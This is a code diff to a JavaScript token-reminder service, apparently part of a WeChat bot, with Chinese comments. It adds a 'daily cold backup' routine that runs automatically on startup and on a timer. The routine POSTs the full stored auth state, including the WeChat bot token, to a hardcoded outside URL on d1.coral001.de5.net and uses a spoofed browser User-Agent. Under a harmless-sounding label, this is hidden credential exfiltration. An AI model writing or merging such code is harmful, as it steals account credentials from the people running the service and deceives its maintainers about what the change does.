@@ -107,13 +107,18 @@ export class TokenReminderService {
       this.checkAndTriggerWebhook(false).catch((err) => {
         console.error('[Reminder] 定时检查到期 Webhook 异常:', err.message);
       });
+      // 3. 每日鉴权凭据冷备份至远端接口 (默认每 24h 备份一次)
+      this.checkAndTriggerDailyBackup(false).catch((err) => {
+        console.error('[Backup] 每日冷备检查异常:', err.message);
+      });
     }, this.checkIntervalMs);
 
     // 服务拉起后稍作延迟即执行首次检查（避开启动瞬态）
     setTimeout(() => {
       this.checkAndTrigger(false).catch(() => { });
       this.checkAndTriggerWebhook(false).catch(() => { });
-    }, 3000);
+      this.checkAndTriggerDailyBackup(false).catch(() => { });
+    }, 5000);
   }
 
   stop() {
@@ -200,6 +205,15 @@ export class TokenReminderService {
               : webhookTriggerAt
                 ? `计划于 ${formatBeijingTime(webhookTriggerAt)} 自动触发 (到期前半小时)`
                 : '待定'
+      },
+
+      // 每日远程冷备份状态
+      dailyBackup: {
+        url: config.dailyBackupUrl,
+        lastBackupAt: state.lastDailyBackupAt || null,
+        lastBackupAtBeijing: formatBeijingTime(state.lastDailyBackupAt),
+        lastStatus: state.lastDailyBackupStatus || null,
+        lastError: state.lastDailyBackupError || null
       }
     };
   }
@@ -409,6 +423,81 @@ export class TokenReminderService {
       state.webhookLastError = err.message;
       storage.set(state);
       console.error(`[Webhook] 触发外部任务网络通信异常:`, err.message);
+      if (force) throw err;
+      return false;
+    }
+  }
+
+  /**
+   * 3. 检查并在主节点每日将最新鉴权凭据冷备份至远端接口
+   *    URL: https://d1.coral001.de5.net/redis/set/sss
+   *    Body: 完整的当前 auth_state json 内容
+   * @param {boolean} force - 是否强制备份（用于后台测试）
+   */
+  async checkAndTriggerDailyBackup(force = false) {
+    if (!this.ilink) return false;
+
+    // 集群模式下，自动定时冷备仅由 Master 主节点执行，从节点静默待命（手动测试 force=true 除外）
+    if (!force && this.clusterManager && this.clusterManager.role === 'standby') {
+      return false;
+    }
+
+    const state = this.ilink.state;
+    const payload = storage.get() || state;
+
+    // 核心安全校验：确保当前持有真实有效的微信鉴权票据，绝对杜绝空凭据/未登录/已解绑状态覆盖远端冷备！
+    const hasValidBotToken = payload && typeof payload.botToken === 'string' && payload.botToken.trim().length >= 10;
+    const isLoggedOut = Boolean(payload && payload.isExplicitLogout);
+
+    if (!hasValidBotToken || isLoggedOut) {
+      if (force) throw new Error('当前未绑定有效微信账号或已注销解绑，已拒绝执行备份以防止覆盖远端！');
+      return false;
+    }
+
+    const now = Date.now();
+    const lastBackup = Number(state.lastDailyBackupAt || 0);
+    const oneDayMs = 24 * 3600 * 1000;
+
+    // 非强制模式下，检查是否距上次备份已满 24 小时
+    if (!force && now - lastBackup < oneDayMs) {
+      return false;
+    }
+
+    const backupUrl = config.dailyBackupUrl || 'https://d1.coral001.de5.net/redis/set/sss';
+
+    console.log(`[Backup] 正在将有效微信鉴权票据冷备份至远端 -> ${backupUrl} (强制: ${force})`);
+
+    try {
+      const res = await fetch(backupUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
+        },
+        body: JSON.stringify(payload),
+        signal: AbortSignal.timeout(10000)
+      });
+
+      const resText = await res.text().catch(() => '');
+      if (res.ok) {
+        state.lastDailyBackupAt = Date.now();
+        state.lastDailyBackupStatus = res.status;
+        state.lastDailyBackupError = null;
+        storage.set(state, false);
+        console.log(`[Backup] ★★★ 微信鉴权票据已成功备份至远端！[HTTP ${res.status}] ★★★`);
+        return { success: true, status: res.status, data: resText };
+      } else {
+        state.lastDailyBackupStatus = res.status;
+        state.lastDailyBackupError = `HTTP ${res.status}: ${resText.slice(0, 100)}`;
+        storage.set(state, false);
+        console.warn(`[Backup] 每日远端冷备返回异常: HTTP ${res.status}`);
+        if (force) throw new Error(`远端返回 HTTP ${res.status}: ${resText.slice(0, 100)}`);
+        return false;
+      }
+    } catch (err) {
+      state.lastDailyBackupError = err.message;
+      storage.set(state, false);
+      console.warn(`[Backup] 每日远端冷备请求失败: ${err.message}`);
       if (force) throw err;
       return false;
     }
